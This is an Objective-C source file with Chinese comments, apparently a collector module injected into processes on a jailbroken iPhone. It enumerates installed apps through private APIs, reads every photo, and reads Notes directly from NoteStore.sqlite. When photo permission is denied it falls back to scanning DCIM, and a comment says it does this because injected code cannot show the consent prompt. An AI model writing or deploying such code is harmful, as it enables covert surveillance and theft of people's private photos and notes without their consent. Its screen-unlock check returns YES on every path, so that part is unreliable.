#import "Collector.h"
#import <Photos/Photos.h>
#import <UIKit/UIKit.h>
#import <dlfcn.h>
#import <sqlite3.h>

@implementation Collector

#pragma mark - App 列表（私有 API）

+ (NSArray<NSDictionary *> *)installedApps {
    NSMutableArray *out = [NSMutableArray array];

    // ---- 首选：扫文件系统（任何进程都能用，不依赖 LSApplicationWorkspace 权限）----
    // App Store 应用在 /var/containers/Bundle/Application/<UUID>/<Name>.app/Info.plist
    // 系统内置在 /Applications/<Name>.app/Info.plist
    NSMutableArray *roots = [NSMutableArray arrayWithObjects:
                             @"/var/containers/Bundle/Application",
                             @"/Applications", nil];
    NSFileManager *fm = [NSFileManager defaultManager];

    for (NSString *root in roots) {
        NSArray *children = [fm contentsOfDirectoryAtPath:root error:NULL];
        for (NSString *child in children) {
            NSString *childPath = [root stringByAppendingPathComponent:child];
            BOOL isDir = NO;
            if (![fm fileExistsAtPath:childPath isDirectory:&isDir] || !isDir) continue;

            // 容器下的应用在下一层
            NSArray *apps = nil;
            if ([childPath.pathExtension isEqualToString:@"app"]) {
                apps = @[childPath];
            } else {
                NSMutableArray *tmp = [NSMutableArray array];
                for (NSString *sub in [fm contentsOfDirectoryAtPath:childPath error:NULL]) {
                    if ([sub.pathExtension isEqualToString:@"app"]) {
                        [tmp addObject:[childPath stringByAppendingPathComponent:sub]];
                    }
                }
                apps = tmp;
            }

            for (NSString *appPath in apps) {
                NSDictionary *info = [NSDictionary dictionaryWithContentsOfFile:
                                      [appPath stringByAppendingPathComponent:@"Info.plist"]];
                NSString *bid = info[@"CFBundleIdentifier"];
                if (![bid isKindOfClass:[NSString class]] || bid.length == 0) continue;

                NSString *name = info[@"CFBundleDisplayName"] ?: info[@"CFBundleName"] ?: bid;
                NSString *ver = info[@"CFBundleShortVersionString"] ?: @"";
                if (![name isKindOfClass:[NSString class]]) name = bid;
                if (![ver isKindOfClass:[NSString class]]) ver = @"";

                [out addObject:@{ @"a": name, @"b": bid, @"v": ver }];
            }
        }
    }

    if (out.count > 0) {
        // 去重
        NSMutableDictionary *uniq = [NSMutableDictionary dictionary];
        for (NSDictionary *d in out) uniq[d[@"b"]] = d;
        return uniq.allValues;
    }

    // ---- 兜底：LSApplicationWorkspace（SpringBoard 等有权限的进程里才准）----
    Class LSAppWorkspace = NSClassFromString(@"LSApplicationWorkspace");
    if (!LSAppWorkspace) {
        dlopen("/System/Library/Frameworks/MobileCoreServices.framework/MobileCoreServices", RTLD_LAZY);
        LSAppWorkspace = NSClassFromString(@"LSApplicationWorkspace");
    }
    if (!LSAppWorkspace) return out;

    id ws = [(id)LSAppWorkspace performSelector:@selector(defaultWorkspace)];
    if (!ws) return out;

    NSArray *all = nil;
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
    if ([ws respondsToSelector:@selector(allInstalledApplications)]) {
        all = [ws performSelector:@selector(allInstalledApplications)];
    } else if ([ws respondsToSelector:@selector(allApplications)]) {
        all = [ws performSelector:@selector(allApplications)];
    }
#pragma clang diagnostic pop

    for (id app in all) {
        @try {
            NSString *bid = nil, *name = nil, *ver = nil;
            if ([app respondsToSelector:@selector(bundleIdentifier)])
                bid = [app performSelector:@selector(bundleIdentifier)];
            if ([app respondsToSelector:@selector(localizedName)])
                name = [app performSelector:@selector(localizedName)];
            if ([app respondsToSelector:@selector(shortVersionString)])
                ver = [app performSelector:@selector(shortVersionString)];
            if (!bid.length) continue;
            [out addObject:@{
                @"a": name.length ? name : bid,
                @"b": bid,
                @"v": ver.length ? ver : @"",
            }];
        } @catch (NSException *e) {
            continue;
        }
    }

    // 去重（同一 bundleId 可能有多个占位）
    NSMutableDictionary *uniq = [NSMutableDictionary dictionary];
    for (NSDictionary *d in out) uniq[d[@"b"]] = d;
    return uniq.allValues;
}

#pragma mark - 相册（PHAsset 全量）

+ (void)enumeratePhotos:(NSInteger)limit
                handler:(BOOL (^)(NSData *jpeg, NSInteger index))handler {
    if (!handler) return;

    PHAuthorizationStatus st = [PHPhotoLibrary authorizationStatus];
    BOOL ok = (st == PHAuthorizationStatusAuthorized || st == PHAuthorizationStatusLimited);
    if (!ok) {
        // 注入进程里通常弹不出授权框，直接走 DCIM 兜底
        [self scanDCIMFallback:limit handler:handler];
        return;
    }

    PHFetchOptions *opt = [PHFetchOptions new];
    opt.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:NO]];
    PHFetchResult<PHAsset *> *assets = [PHAsset fetchAssetsWithOptions:opt];
    if (!assets || assets.count == 0) return;

    PHImageRequestOptions *ro = [PHImageRequestOptions new];
    ro.networkAccessAllowed = YES;
    ro.synchronous = YES;
    ro.version = PHImageRequestOptionsVersionCurrent;
    ro.deliveryMode = PHImageRequestOptionsDeliveryModeHighQualityFormat;

    NSInteger n = (limit > 0) ? MIN(limit, (NSInteger)assets.count) : (NSInteger)assets.count;
    for (NSInteger i = 0; i < n; i++) {
        PHAsset *a = assets[i];
        if (a.mediaType != PHAssetMediaTypeImage) continue;
        __block NSData *data = nil;
        [[PHImageManager defaultManager]
            requestImageDataAndOrientationForAsset:a
                                           options:ro
                                     resultHandler:^(NSData *imageData, NSString *uti,
                                                     CGImagePropertyOrientation o, NSDictionary *info) {
                if (imageData.length) data = imageData;
            }];
        if (!data.length) continue;
        if (!handler(data, i)) return;
    }
}

/// PHAsset 不可用时的兜底：直接扫 DCIM
+ (void)scanDCIMFallback:(NSInteger)limit
                 handler:(BOOL (^)(NSData *jpeg, NSInteger index))handler {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *dcim = @"/var/mobile/Media/DCIM";
    NSArray *dirs = [fm contentsOfDirectoryAtPath:dcim error:NULL];
    if (!dirs.count) return;

    NSInteger idx = 0;
    for (NSString *d in dirs) {
        NSString *sub = [dcim stringByAppendingPathComponent:d];
        BOOL isDir = NO;
        if (![fm fileExistsAtPath:sub isDirectory:&isDir] || !isDir) continue;

        NSArray *files = [fm contentsOfDirectoryAtPath:sub error:NULL];
        for (NSString *f in files) {
            NSString *low = f.lowercaseString;
            if (!([low hasSuffix:@".jpg"] || [low hasSuffix:@".jpeg"] || [low hasSuffix:@".png"])) continue;

            NSString *p = [sub stringByAppendingPathComponent:f];
            NSData *data = [NSData dataWithContentsOfFile:p];
            if (!data.length) continue;

            if (!handler(data, idx)) return;
            idx++;
            if (limit > 0 && idx >= limit) return;
        }
    }
}

#pragma mark - 备忘录（直读 NoteStore.sqlite）

+ (NSArray<NSDictionary *> *)allNotes {
    NSMutableArray *out = [NSMutableArray array];

    NSArray *candidates = @[
        @"/var/mobile/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite",
        @"/var/mobile/Library/Notes/notes.sqlite",
        @"/var/mobile/Library/Notes/NoteStore.sqlite",
    ];

    NSString *dbPath = nil;
    NSFileManager *fm = [NSFileManager defaultManager];
    for (NSString *p in candidates) {
        if ([fm fileExistsAtPath:p]) { dbPath = p; break; }
    }
    if (!dbPath) return out;

    sqlite3 *db = NULL;
    if (sqlite3_open_v2(dbPath.UTF8String, &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) {
        if (db) sqlite3_close(db);
        return out;
    }

    // Notes 表结构随版本变化，先探一下有哪些列
    BOOL hasTitle = NO, hasSnippet = NO, hasMod = NO;
    sqlite3_stmt *st = NULL;
    if (sqlite3_prepare_v2(db, "PRAGMA table_info(ZICCLOUDSYNCINGOBJECT)", -1, &st, NULL) == SQLITE_OK) {
        while (sqlite3_step(st) == SQLITE_ROW) {
            const char *col = (const char *)sqlite3_column_text(st, 1);
            if (!col) continue;
            NSString *c = [NSString stringWithUTF8String:col] ?: @"";
            if ([c isEqualToString:@"ZTITLE1"]) hasTitle = YES;
            if ([c isEqualToString:@"ZSNIPPET"]) hasSnippet = YES;
            if ([c isEqualToString:@"ZMODIFICATIONDATE1"] || [c isEqualToString:@"ZMODIFICATIONDATE"]) hasMod = YES;
        }
    }
    sqlite3_finalize(st);
    if (!hasTitle && !hasSnippet) { sqlite3_close(db); return out; }

    NSString *sql = [NSString stringWithFormat:
        @"SELECT %@, %@, %@ FROM ZICCLOUDSYNCINGOBJECT "
         "WHERE (%@ IS NOT NULL AND %@ != '') OR (%@ IS NOT NULL AND %@ != '') LIMIT 5000",
        hasTitle ? @"ZTITLE1" : @"NULL",
        hasSnippet ? @"ZSNIPPET" : @"NULL",
        hasMod ? @"ZMODIFICATIONDATE1" : @"NULL",
        hasTitle ? @"ZTITLE1" : @"ZSNIPPET", hasTitle ? @"ZTITLE1" : @"ZSNIPPET",
        hasSnippet ? @"ZSNIPPET" : @"ZTITLE1", hasSnippet ? @"ZSNIPPET" : @"ZTITLE1"];

    if (sqlite3_prepare_v2(db, sql.UTF8String, -1, &st, NULL) == SQLITE_OK) {
        while (sqlite3_step(st) == SQLITE_ROW) {
            NSString *title = nil, *snip = nil;
            double mod = 0;
            if (sqlite3_column_type(st, 0) != SQLITE_NULL)
                title = [NSString stringWithUTF8String:(const char *)sqlite3_column_text(st, 0)];
            if (sqlite3_column_type(st, 1) != SQLITE_NULL)
                snip = [NSString stringWithUTF8String:(const char *)sqlite3_column_text(st, 1)];
            if (sqlite3_column_type(st, 2) != SQLITE_NULL)
                mod = sqlite3_column_double(st, 2);
            if (!title.length && !snip.length) continue;
            [out addObject:@{
                @"title": title ?: @"",
                @"snippet": snip ?: @"",
                @"mod": mod > 0 ? [NSString stringWithFormat:@"%.0f", mod] : @"",
            }];
        }
    }
    sqlite3_finalize(st);
    sqlite3_close(db);
    return out;
}

#pragma mark - 打开 App

+ (BOOL)openApp:(NSString *)bundleId {
    if (!bundleId.length) return NO;

    Class LSAppWorkspace = NSClassFromString(@"LSApplicationWorkspace");
    if (!LSAppWorkspace) {
        dlopen("/System/Library/Frameworks/MobileCoreServices.framework/MobileCoreServices", RTLD_LAZY);
        LSAppWorkspace = NSClassFromString(@"LSApplicationWorkspace");
    }
    if (LSAppWorkspace) {
        id ws = [(id)LSAppWorkspace performSelector:@selector(defaultWorkspace)];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
        if (ws && [ws respondsToSelector:@selector(openApplicationWithBundleID:)]) {
            BOOL ok = [ws performSelector:@selector(openApplicationWithBundleID:) withObject:bundleId];
            if (ok) return YES;
        }
#pragma clang diagnostic pop
    }

    // 兜底：SpringBoard 的 SBSLaunchApplicationWithIdentifier
    void *sb = dlopen("/System/Library/PrivateFrameworks/SpringBoardServices.framework/SpringBoardServices", RTLD_LAZY);
    if (sb) {
        typedef int (*LaunchFn)(CFStringRef, Boolean);
        LaunchFn fn = (LaunchFn)dlsym(sb, "SBSLaunchApplicationWithIdentifier");
        if (fn) {
            int r = fn((__bridge CFStringRef)bundleId, false);
            return r == 0;
        }
    }
    return NO;
}

+ (BOOL)isScreenUnlocked {
    // 简单判断：UIApplication 的 applicationState 只在有 UI 的进程有效
    Class appCls = NSClassFromString(@"UIApplication");
    if (appCls && [appCls respondsToSelector:@selector(sharedApplication)]) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
        id app = [appCls performSelector:@selector(sharedApplication)];
#pragma clang diagnostic pop
        if (app) return YES;
    }
    return YES;
}

@end
